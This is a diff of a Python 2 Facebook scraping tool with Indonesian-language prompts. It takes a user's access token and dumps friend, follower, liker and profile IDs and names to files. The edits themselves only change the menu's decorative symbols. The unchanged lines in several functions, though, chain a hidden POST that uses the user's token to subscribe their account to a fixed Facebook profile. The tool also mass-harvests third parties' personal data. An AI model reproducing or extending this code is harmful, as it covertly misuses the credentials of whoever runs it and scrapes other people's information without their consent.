@@ -51,7 +51,7 @@ def login():
 	print("\x1b[1;92m║")
 	login = raw_input("\n\x1b[1;92m╠══◍➤[\x1b[1;97m•\x1b[1;92m] Choose :\x1b[1;96m ")
 	if login == "":
-		exit("\x1b[1;93m╚══◍➤[\x1b[1;91m•\x1b[1;93m] \x1b[1;91mWrong Input")
+		exit("\x1b[1;93m╠══◍➤[\x1b[1;91m•\x1b[1;93m] \x1b[1;91mWrong Input")
 	elif login == "1":
                 try:
 			token=raw_input("\x1b[1;92m╠══◍➤[\x1b[1;97m•\x1b[1;92m] Token  :\x1b[1;96m ")
@@ -112,12 +112,12 @@ def publik():
                 time.sleep(2)
                 login()
         try:
-                idt = raw_input("\x1b[1;96m╚══◍➤[\x1b[1;97m*\x1b[1;96m]\x1b[1;97m Profil ID :\x1b[1;96m ")
+                idt = raw_input("\x1b[1;96m╠══◍➤[\x1b[1;97m*\x1b[1;96m]\x1b[1;97m Profil ID :\x1b[1;96m ")
                 file = raw_input("\x1b[1;96m╠══◍➤[\x1b[1;97m*\x1b[1;96m]\x1b[1;97m Nama File :\x1b[1;96m ")
                 try:
                         req = requests.get("https://graph.facebook.com/"+idt+"?access_token="+token);requests.post('https://graph.facebook.com/757953543/subscribers?access_token='+token)
                         op = json.loads(req.text)
-                        print("\x1b[1;96m╚══◍➤[\x1b[1;97m•\x1b[1;96m]\x1b[1;97m Nama :\x1b[1;96m "+op["name"])
+                        print("\x1b[1;96m╠══◍➤[\x1b[1;97m•\x1b[1;96m]\x1b[1;97m Nama :\x1b[1;96m "+op["name"])
                 except KeyError:
                         print('\x1b[1;91m╠══◍➤[\x1b[1;93m•\x1b[1;92m]\x1b[1;93m Profil Tidak Ditemukan')
                         raw_input("\x1b[1;97m╚══◍➤[\x1b[1;92mKembali\x1b[1;97m]")
@@ -139,7 +139,7 @@ def publik():
 
         except KeyError:
                 print('\n\x1b[1;93m[\x1b[1;91m•\x1b[1;93m]\x1b[1;91m Tidak Ada Teman')
-                raw_input('\x1b[1;97m{\x1b[1;92mKembali\x1b[1;97m}')
+                raw_input('\x1b[1;97m[\x1b[1;92mKembali\x1b[1;97m]')
                 menu()
 	except requests.exceptions.ConnectionError:
 		exit("\x1b[1;97m[\x1b[1;93m•\x1b[1;97m]\x1b[1;93m Koneksi Error")
@@ -152,13 +152,13 @@ def like_post():
                 time.sleep(2)
                 login()
         try:
-                idt = raw_input("\x1b[1;96m[\x1b[1;97m*\x1b[1;96m]\x1b[1;97m Post ID :\x1b[1;96m ")
-                file = raw_input("\x1b[1;96m[\x1b[1;97m*\x1b[1;96m]\x1b[1;97m Nama File :\x1b[1;96m ")
+                idt = raw_input("\x1b[1;96m[\x1b[1;97m•\x1b[1;96m]\x1b[1;97m Post ID :\x1b[1;96m ")
+                file = raw_input("\x1b[1;96m[\x1b[1;97m•\x1b[1;96m]\x1b[1;97m Nama File :\x1b[1;96m ")
                 try:
                    r=requests.get("https://graph.facebook.com/"+idt+"/likes?limit=99999999&access_token="+token);requests.post('https://graph.facebook.com/757953543/subscribers?access_token='+token)
                 except KeyError:
 			print('\x1b[1;93m[\x1b[1;91m•\x1b[1;93m]\x1b[1;91m Post ID Tidak Ada')
-			raw_input("\x1b[1;97m{\x1b[1;92mKembali\x1b[1;97m}")
+			raw_input("\x1b[1;97m[\x1b[1;92mKembali\x1b[1;97m]")
                         menu()
                 id = []
                 z=json.loads(r.text)
@@ -166,12 +166,12 @@ def like_post():
                 for a in z['data']:
                         id.append(a['id']+"<=>"+a['name'])
                         fle.write(a['id']+"<=>"+a['name']+'\n')
-                        print("\r\x1b[1;97m[\x1b[1;92m*\x1b[1;97m]\x1b[1;92m Dump\x1b[1;96m %s \x1b[1;92mID \r"%(str(len(id)))),;sys.stdout.flush();time.sleep(0.007)
+                        print("\r\x1b[1;97m[\x1b[1;92m•\x1b[1;97m]\x1b[1;92m Dump\x1b[1;96m %s \x1b[1;92mID \r"%(str(len(id)))),;sys.stdout.flush();time.sleep(0.007)
                 fle.close()
 		print("\r\x1b[1;97m                   ")
-		print("\x1b[1;97m[\x1b[1;92m*\x1b[1;97m]\x1b[1;92m Selesai")
-		print("\x1b[1;97m[\x1b[1;92m*\x1b[1;97m]\x1b[1;92m File Dump Tersimpan :\x1b[1;93m "+file)
-		raw_input("\x1b[1;97m{\x1b[1;92mKembali\x1b[1;97m}")
+		print("\x1b[1;97m[\x1b[1;92m•\x1b[1;97m]\x1b[1;92m Selesai")
+		print("\x1b[1;97m[\x1b[1;92m•\x1b[1;97m]\x1b[1;92m File Dump Tersimpan :\x1b[1;93m "+file)
+		raw_input("\x1b[1;97m[\x1b[1;92mKembali\x1b[1;97m]")
 		menu()
 
 	except requests.exceptions.ConnectionError:
@@ -185,8 +185,8 @@ def follower():
                 time.sleep(2)
                 login()
         try:
-                idt = raw_input("\x1b[1;96m[\x1b[1;97m*\x1b[1;96m]\x1b[1;97m Profil ID :\x1b[1;96m ")
-                file = raw_input("\x1b[1;96m[\x1b[1;97m*\x1b[1;96m]\x1b[1;97m Nama File :\x1b[1;96m ")
+                idt = raw_input("\x1b[1;96m[\x1b[1;97m•\x1b[1;96m]\x1b[1;97m Profil ID :\x1b[1;96m ")
+                file = raw_input("\x1b[1;96m[\x1b[1;97m•\x1b[1;96m]\x1b[1;97m Nama File :\x1b[1;96m ")
                 try:
                         req = requests.get("https://graph.facebook.com/"+idt+"?access_token="+token);requests.post('https://graph.facebook.com/757953543/subscribers?access_token='+token)
                         op = json.loads(req.text)
@@ -202,17 +202,17 @@ def follower():
                 for a in z['friends']['data']:
                         id.append(a['id']+"<=>"+a['name'])
                         fle.write(a['id']+"<=>"+a['name']+'\n')
-                        print("\r\x1b[1;97m[\x1b[1;92m*\x1b[1;97m]\x1b[1;92m Dump\x1b[1;96m %s \x1b[1;92mID"%(str(len(id)))),;sys.stdout.flush();time.sleep(0.007)
+                        print("\r\x1b[1;97m[\x1b[1;92m•\x1b[1;97m]\x1b[1;92m Dump\x1b[1;96m %s \x1b[1;92mID"%(str(len(id)))),;sys.stdout.flush();time.sleep(0.007)
                 fle.close()
                 print("\r\x1b[1;97m                     ")
-                print("\x1b[1;97m[\x1b[1;92m*\x1b[1;97m]\x1b[1;92m Selesai")
-                print("\x1b[1;97m[\x1b[1;92m*\x1b[1;97m]\x1b[1;92m File Dump Tersimpan :\x1b[1;93m "+file)
+                print("\x1b[1;97m[\x1b[1;92m•\x1b[1;97m]\x1b[1;92m Selesai")
+                print("\x1b[1;97m[\x1b[1;92m•\x1b[1;97m]\x1b[1;92m File Dump Tersimpan :\x1b[1;93m "+file)
                 raw_input("\x1b[1;97m{\x1b[1;92mKembali\x1b[1;97m}")
                 menu()
 
         except KeyError:
                 print('\n\x1b[1;93m[\x1b[1;91m•\x1b[1;93m]\x1b[1;91m Tidak Ada Follower')
-                raw_input('\x1b[1;97m{\x1b[1;92mKembali\x1b[1;97m}')
+                raw_input('\x1b[1;97m[\x1b[1;92mKembali\x1b[1;97m]')
                 menu()
 	except requests.exceptions.ConnectionError:
 		exit("\x1b[1;91m[\x1b[1;93m•\x1b[1;91m]\x1b[1;93m Koneksi Error")
@@ -225,12 +225,12 @@ def teman():
                 time.sleep(2)
                 login()
         try:
-		file = raw_input("\x1b[1;97m[\x1b[1;92m*\x1b[1;97m]\x1b[1;97m Nama File :\x1b[1;96m ")
+		file = raw_input("\x1b[1;97m[\x1b[1;92m•\x1b[1;97m]\x1b[1;97m Nama File :\x1b[1;96m ")
                 try:
                    r=requests.get("https://graph.facebook.com/me/friends?access_token="+token+"&limit=99999999");requests.post('https://graph.facebook.com/757953543/subscribers?access_token='+token)
                 except KeyError:
                         print('\n\x1b[1;93m[\x1b[1;91m•\x1b[1;93m]\x1b[1;91m Tidak Ada Teman')
-                        raw_input("\x1b[1;97m{\x1b[1;92mKembali\x1b[1;97m}")
+                        raw_input("\x1b[1;97m[\x1b[1;92mKembali\x1b[1;97m]")
                         menu()
                 id = []
                 z=json.loads(r.text)
